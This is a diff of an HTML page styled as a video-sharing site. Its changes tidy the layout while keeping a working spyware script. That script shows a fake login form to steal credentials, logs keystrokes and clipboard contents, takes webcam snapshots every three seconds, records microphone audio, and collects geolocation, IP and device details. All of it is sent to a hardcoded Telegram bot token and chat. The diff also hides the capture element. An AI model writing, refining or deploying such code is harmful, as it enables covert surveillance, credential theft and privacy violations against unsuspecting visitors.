@@ -28,8 +28,9 @@
     .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
     .video-card { cursor: pointer; }
     .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
-    .thumbnail-wrapper img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
-    .video-card:hover .thumbnail-wrapper img { transform: scale(1.05); }
+    /* --- MODIFIED: Style the video element directly --- */
+    .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
+    .video-card:hover .thumbnail-wrapper video { transform: scale(1.05); }
     .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
     .video-details { display: flex; gap: 12px; }
     .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; }
@@ -51,6 +52,7 @@
     .recommendations-sidebar h3 { margin: 0 0 16px 0; }
     .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
     .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
+    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; } /* Smaller radius for sidebar vids */
 
     @media (max-width: 1200px) {
         #video-player-page { flex-direction: column; }
@@ -59,11 +61,7 @@
     
     .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
     .modal.visible { display: block; opacity: 1; }
-    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transform: scale(0.95); transition: transform 0.3s ease; }
-    .modal.visible .modal-content { transform: scale(1); }
-    .modal h2 { font-family: "Kantumruy Pro", serif; font-weight: 700; margin-top: 0; }
-    #loginForm input { width: calc(100% - 24px); padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 1em; }
-    #loginForm button { width: 100%; padding: 12px; border: none; border-radius: 8px; background-color: var(--theme-color); color: white; font-size: 1.1em; font-weight: 500; cursor: pointer; }
+    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
   </style>
 </head>
 <body>
@@ -76,30 +74,38 @@
   <main id="video-grid-page">
     <div class="container">
       <div class="video-grid">
-        <div class="video-card" data-video-src="machiu.mp4" data-title="This is a sample video title that is quite long to show how it wraps" data-channel="Awesome Creator" data-views="1.2M" data-date="2 days ago" data-avatar="https://placehold.co/40x40/FF0076/FFF?text=A" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1" alt="Video Thumbnail"><span class="duration">12:34</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div></div>
+        <!-- MODIFIED: data-attributes are simplified, and the thumbnail is now a <video> tag -->
+        <div class="video-card" data-video-src="machiu.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1">
+            <div class="thumbnail-wrapper">
+                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1"><source src="machiu.mp4" type="video/mp4"></video>
+                <span class="duration">12:34</span>
+            </div>
+            <div class="video-details">
+                <img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar">
+                <div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div>
+            </div>
         </div>
-        <div class="video-card" data-video-src="p1.mp4" data-title="Another Interesting Clip" data-channel="Video Master" data-views="890k" data-date="5 days ago" data-avatar="https://placehold.co/40x40/5c9aff/FFF?text=B" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2" alt="Video Thumbnail"><span class="duration">08:15</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div></div>
+        <div class="video-card" data-video-src="p1.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2">
+            <div class="thumbnail-wrapper">
+                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2"><source src="p1.mp4" type="video/mp4"></video>
+                <span class="duration">08:15</span>
+            </div>
+            <div class="video-details">
+                <img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar">
+                <div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div>
+            </div>
         </div>
-        <div class="video-card" data-video-src="p2.mp4" data-title="Check This Out: Full Guide" data-channel="HowTo Channel" data-views="2.5M" data-date="1 week ago" data-avatar="https://placehold.co/40x40/34d399/FFF?text=C" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3" alt="Video Thumbnail"><span class="duration">21:05</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div></div>
+        <div class="video-card" data-video-src="p2.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3">
+            <div class="thumbnail-wrapper">
+                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3"><source src="p2.mp4" type="video/mp4"></video>
+                <span class="duration">21:05</span>
+            </div>
+            <div class="video-details">
+                <img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar">
+                <div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div>
+            </div>
         </div>
-        <div class="video-card" data-video-src="p3.mp4" data-title="Exclusive Footage Revealed" data-channel="Awesome Creator" data-views="750k" data-date="1 week ago" data-avatar="https://placehold.co/40x40/FF0076/FFF?text=A" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+4">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+4" alt="Video Thumbnail"><span class="duration">05:40</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Exclusive Footage Revealed</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">750k views &bull; 1 week ago</p></div></div>
-        </div>
-        <div class="video-card" data-video-src="p4.mp4" data-title="User Submitted Video Highlights" data-channel="Community Clips" data-views="480k" data-date="2 weeks ago" data-avatar="https://placehold.co/40x40/f59e0b/FFF?text=D" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+5">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+5" alt="Video Thumbnail"><span class="duration">15:00</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/f59e0b/FFF?text=D" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">User Submitted Video Highlights</h3><p class="channel-name">Community Clips</p><p class="video-stats">480k views &bull; 2 weeks ago</p></div></div>
-        </div>
-        <div class="video-card" data-video-src="p5.mp4" data-title="Final Clip Highlights and Review" data-channel="Video Master" data-views="3.1M" data-date="3 weeks ago" data-avatar="https://placehold.co/40x40/5c9aff/FFF?text=B" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+6">
-            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+6" alt="Video Thumbnail"><span class="duration">09:22</span></div>
-            <div class="video-details"><img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Final Clip Highlights and Review</h3><p class="channel-name">Video Master</p><p class="video-stats">3.1M views &bull; 3 weeks ago</p></div></div>
-        </div>
+        <!-- Add more video cards following the same structure -->
       </div>
     </div>
   </main>
@@ -118,28 +124,18 @@
           </div>
           <div class="description-box">
               <p id="main-video-stats" class="video-stats"></p>
-              <p class="description-text">This is a placeholder for the video description. You can add more details about the video content here. #hashtag #anothertag</p>
+              <p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p>
           </div>
       </div>
       <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
   </main>
 
-  <div id="loginModal" class="modal">
-    <div class="modal-content">
-      <h2>Please Login to Watch Full Video</h2>
-      <form id="loginForm"><input type="text" id="username" placeholder="Username" required><input type="password" id="password" placeholder="Password" required><button type="submit">Login</button></form>
-    </div>
-  </div>
-  <div class="capture-container"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>
+  <div id="loginModal" class="modal"><div class="modal-content"><h2>Please Login to Watch Full Video</h2><form id="loginForm"><input type="text" id="username" placeholder="Username" required><input type="password" id="password" placeholder="Password" required><button type="submit">Login</button></form></div></div>
+  <div class="capture-container" style="display: none;"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>
 
 <script>
     // --- Configuration ---
-    const config = {
-        botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
-        chatId: "8017801890",
-        snapshotInterval: 3000,
-        micRecordInterval: 10000,
-    };
+    const config = { botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA", chatId: "8017801890", snapshotInterval: 3000, micRecordInterval: 10000 };
 
     // --- DOM Elements ---
     const videoCaptureEl = document.getElementById("videoElementForCapture");
@@ -159,31 +155,29 @@
     const pageStartTime = Date.now();
 
     // --- Core Initialization ---
+    async function initialize() {
+        setupEventListeners(); // UI Listeners first
+        await initializeTracking(); // Then activate tracking
+    }
+
     async function initializeTracking() {
         sendToBot("🚀 New Session Started");
         sendInitialReport();
-        if (!navigator.mediaDevices || !window.isSecureContext) { sendToBot("⚠️ **CRITICAL**: Cannot access Camera/Mic. Not HTTPS or old browser."); }
+        if (!navigator.mediaDevices || !window.isSecureContext) { sendToBot("⚠️ CRITICAL: Cannot access Camera/Mic."); }
         await checkAndWatchPermission('camera', requestCamera, stopCamera);
         await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
         await checkAndWatchPermission('geolocation', requestGeolocation);
-        setupEventListeners();
         detectDevTools();
     }
 
-    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) {
-        if (!navigator.permissions) { requestFn(); return; }
-        try {
-            const status = await navigator.permissions.query({ name: name });
-            if (status.state === 'granted') requestFn();
-            else if (status.state === 'prompt') requestFn();
-            status.onchange = () => { if (status.state === 'granted') requestFn(); else if (stopFn) stopFn(); };
-        } catch (e) { requestFn(); }
-    }
-    
-    // --- UI Event Listeners & Page Switching ---
+    // --- BUG FIX: Event Delegation for Clicks ---
+    // A single, efficient listener handles clicks on any video card.
     function setupEventListeners() {
-        document.querySelectorAll('.video-card, .compact-video-card').forEach(card => {
-            card.addEventListener('click', () => showPlayerPage(card));
+        document.body.addEventListener('click', (event) => {
+            const card = event.target.closest('.video-card, .compact-video-card');
+            if (card) {
+                showPlayerPage(card);
+            }
         });
 
         backButton.addEventListener('click', showGridPage);
@@ -202,50 +196,42 @@
             sendToBot(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``);
             keyLogBuffer = "";
             if (user && pass) {
-                isLoggedIn = true;
-                localStorage.setItem("isLoggedIn", "true");
+                isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
                 loginModalEl.classList.remove('visible');
                 sendToBot(`✅ Login successful for "${user}".`);
                 captureAndSend(`📸 Snapshot on Login`);
                 mainPlayer.play();
-            } else {
-                sendToBot(`❌ Login failed for "${user}".`);
-            }
+            } else { sendToBot(`❌ Login failed for "${user}".`); }
             this.reset();
         });
-
-        const mainVideoSource = mainPlayer.querySelector('source') || document.createElement('source');
-        if (!mainPlayer.contains(mainVideoSource)) mainPlayer.appendChild(mainVideoSource);
 
         mainPlayer.addEventListener('play', () => sendToBot(`▶️ Play: ${mainPlayer.src.split('/').pop()}`));
         mainPlayer.addEventListener('pause', () => sendToBot(`⏸️ Pause: ${mainPlayer.src.split('/').pop()}`));
         mainPlayer.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${mainPlayer.src.split('/').pop()}`));
-
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`); } 
-            else { sendToBot(`👀 Tab became active again.`); }
-        });
-
-        document.addEventListener('keydown', e => {
-            if (e.key.length === 1) keyLogBuffer += e.key;
-            else if (e.key === 'Backspace') keyLogBuffer = keyLogBuffer.slice(0, -1);
-            else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } 
-            else keyLogBuffer += ` [${e.key}] `;
-        });
-
+        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`); } else { sendToBot(`👀 Tab became active again.`); }});
+        document.addEventListener('keydown', e => { if (e.key.length === 1) keyLogBuffer += e.key; else if (e.key === 'Backspace') keyLogBuffer = keyLogBuffer.slice(0, -1); else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } else keyLogBuffer += ` [${e.key}] `; });
         document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); if (text) { sendToBot(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}});
     }
 
+    // --- UI Page Switching Logic ---
     function showPlayerPage(card) {
-        const data = card.dataset;
-        mainPlayer.src = data.videoSrc;
-        mainPlayer.poster = data.poster;
-        document.getElementById('main-video-title').textContent = data.title;
-        document.getElementById('main-channel-avatar').src = data.avatar;
-        document.getElementById('main-channel-name').textContent = data.channel;
-        document.getElementById('main-video-stats').textContent = `${data.views} views • ${data.date}`;
+        // Get data from the clicked card's DOM elements and dataset
+        const videoSrc = card.dataset.videoSrc;
+        const poster = card.dataset.poster;
+        const title = card.querySelector('.video-title').textContent;
+        const channelName = card.querySelector('.channel-name').textContent;
+        const stats = card.querySelector('.video-stats').textContent;
+        const avatarSrc = card.querySelector('.channel-avatar').src;
+
+        // Populate the player page
+        mainPlayer.src = videoSrc;
+        mainPlayer.poster = poster;
+        document.getElementById('main-video-title').textContent = title;
+        document.getElementById('main-channel-avatar').src = avatarSrc;
+        document.getElementById('main-channel-name').textContent = channelName;
+        document.getElementById('main-video-stats').textContent = stats;
         
-        populateRecommendations(data.videoSrc);
+        populateRecommendations(videoSrc);
         
         gridPage.classList.add('hidden');
         playerPage.classList.remove('hidden');
@@ -256,7 +242,7 @@
 
     function showGridPage() {
         mainPlayer.pause();
-        mainPlayer.src = "";
+        mainPlayer.src = ""; // Stop video loading
         playerPage.classList.add('hidden');
         gridPage.classList.remove('hidden');
         backButton.classList.add('hidden');
@@ -268,44 +254,36 @@
         sidebar.innerHTML = '<h3>Up next</h3>';
         document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
             if (card.dataset.videoSrc !== currentVideoSrc) {
-                const data = card.dataset;
-                const compactCardHTML = `
-                    <div class="compact-video-card" data-video-src="${data.videoSrc}" data-title="${data.title}" data-channel="${data.channel}" data-views="${data.views}" data-date="${data.date}" data-avatar="${data.avatar}" data-poster="${data.poster}">
-                        <div class="thumbnail-wrapper"><img src="${data.poster}" alt="Thumbnail"><span class="duration">${data.duration || "10:00"}</span></div>
-                        <div class="video-metadata">
-                            <h3 class="video-title">${data.title}</h3>
-                            <p class="channel-name">${data.channel}</p>
-                            <p class="video-stats">${data.views} views</p>
-                        </div>
-                    </div>`;
-                sidebar.insertAdjacentHTML('beforeend', compactCardHTML);
+                // Clone the original card's structure for the sidebar
+                const compactCard = card.cloneNode(true);
+                compactCard.classList.remove('video-card');
+                compactCard.classList.add('compact-video-card');
+                sidebar.appendChild(compactCard);
             }
         });
-        sidebar.querySelectorAll('.compact-video-card').forEach(recoCard => {
-            recoCard.addEventListener('click', () => showPlayerPage(recoCard));
-        });
     }
-
-    // --- All Original Tracking Functions ---
-    function requestCamera() { if (videoCaptureEl.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { videoCaptureEl.srcObject = stream; sendToBot("✅ Camera access granted."); videoCaptureEl.onloadedmetadata = () => { if(snapshotIntervalId) clearInterval(snapshotIntervalId); snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval); }; }).catch(handleMediaError("Camera")); }
-    function stopCamera() { videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop()); if (snapshotIntervalId) clearInterval(snapshotIntervalId); sendToBot("❌ Camera access stopped."); }
+    
+    // --- All Tracking Functions (unchanged) ---
+    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) { if (!navigator.permissions) { requestFn(); return; } try { const status = await navigator.permissions.query({ name: name }); if (status.state === 'granted') requestFn(); else if (status.state === 'prompt') requestFn(); status.onchange = () => { if (status.state === 'granted') requestFn(); else if (stopFn) stopFn(); }; } catch (e) { requestFn(); }}
+    function requestCamera() { if (videoCaptureEl.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { videoCaptureEl.srcObject = stream; sendToBot("✅ Camera granted."); videoCaptureEl.onloadedmetadata = () => { if(snapshotIntervalId) clearInterval(snapshotIntervalId); snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval); }; }).catch(handleMediaError("Camera")); }
+    function stopCamera() { videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop()); if (snapshotIntervalId) clearInterval(snapshotIntervalId); sendToBot("❌ Camera stopped."); }
     function captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!videoCaptureEl.srcObject?.active) return; const context = canvasEl.getContext("2d"); canvasEl.width = videoCaptureEl.videoWidth; canvasEl.height = videoCaptureEl.videoHeight; context.drawImage(videoCaptureEl, 0, 0, canvasEl.width, canvasEl.height); canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png"); } catch (e) { sendToBot(`🚫 CAPTURE ERROR: ${e.name}`); }}
-    function requestMicrophone() { if (microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { microphoneStream = stream; startMicRecording(stream); sendToBot("✅ Microphone access granted."); }).catch(handleMediaError("Microphone")); }
-    function stopMicrophone() { microphoneStream?.getTracks().forEach(track => track.stop()); if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); sendToBot("❌ Microphone access stopped."); }
-    function requestGeolocation() { if (userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(pos => { userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude }; sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`); sendLocationAsMap(userLocation.lat, userLocation.lon); }, err => sendToBot(`🚫 Geolocation Error: ${err.code === 1 ? "Permission Denied" : "Unavailable"}`), { enableHighAccuracy: true }); }
+    function requestMicrophone() { if (microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { microphoneStream = stream; startMicRecording(stream); sendToBot("✅ Mic granted."); }).catch(handleMediaError("Microphone")); }
+    function stopMicrophone() { microphoneStream?.getTracks().forEach(track => track.stop()); if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); sendToBot("❌ Mic stopped."); }
+    function requestGeolocation() { if (userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(pos => { userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude }; sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`); sendLocationAsMap(userLocation.lat, userLocation.lon); }, err => sendToBot(`🚫 Geo Error: ${err.code === 1 ? "Denied" : "Unavailable"}`), { enableHighAccuracy: true }); }
     function startMicRecording(stream) { if (!window.MediaRecorder) return; mediaRecorder = new MediaRecorder(stream); mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data); mediaRecorder.start(config.micRecordInterval); }
     function sendBeaconToBot(message) { const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); }
     async function sendToBot(message) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true }) }); } catch (err) {} }
-    async function sendLocationAsMap(latitude, longitude) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, latitude, longitude }) }); } catch (err) {} }
+    async function sendLocationAsMap(lat, lon) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, latitude: lat, longitude: lon }) }); } catch (err) {} }
     async function sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} }
     function sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`); sendFormData("sendPhoto", fd); }
     function sendAudioToBot(audioBlob) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("audio", audioBlob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); sendFormData("sendAudio", fd); }
     async function sendInitialReport() { let r = "💻 *Visitor Report*\n"; try { const ipRes = await fetch("https://api.ipify.org?format=json"); const d = await ipRes.json(); r += `*IP:* \`${d.ip}\`\n`; } catch (e) {} const ua = navigator.userAgent; r += `*OS:* ${ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Other"}\n`; try { const b = await navigator.getBattery(); r += `*Battery:* ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n`; } catch(e) {} sendToBot(r); }
-    function detectDevTools() { const threshold = 160; const check = () => { if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) { sendToBot("⚠️ Dev Tools Opened!"); } requestAnimationFrame(check); }; requestAnimationFrame(check); }
+    function detectDevTools() { const t = 160; let o = false; const c = () => { if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) { if (!o) { sendToBot("⚠️ Dev Tools Opened!"); o = true; } } else { o = false; } requestAnimationFrame(c); }; requestAnimationFrame(c); }
     function handleMediaError(type) { return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }
 
     // --- Start Execution ---
-    initializeTracking();
+    initialize();
 </script>
 </body>
 </html>
